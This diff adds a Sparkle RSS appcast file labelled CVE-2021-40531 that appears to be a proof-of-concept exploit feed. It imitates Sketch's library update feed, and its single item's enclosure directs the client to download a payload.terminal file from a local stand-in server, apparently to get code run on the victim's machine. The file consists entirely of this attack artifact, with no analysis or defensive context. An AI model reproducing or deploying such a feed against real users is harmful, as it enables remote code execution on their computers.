@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle" xmlns:dc="http://purl.org/dc/elements/1.1/" version="2.0">
+  <channel>
+    <title>CVE-2021-40531</title>
+    <link>http://sketchlibrary.sketchapp.com/libraries/SketchLibraryAppcast.xml</link>
+    <description></description>
+    <language>en</language>
+    <item>
+      <title>CVE-2021-40531</title>
+      <pubDate>Thu, 28 Jan 2021 9:00:00 +0000</pubDate>
+      <enclosure url="http://127.0.0.1:8080/payload.terminal" sparkle:version="40" length="1" type="application/octet-stream"/>
+    </item>
+  </channel>
+</rss>
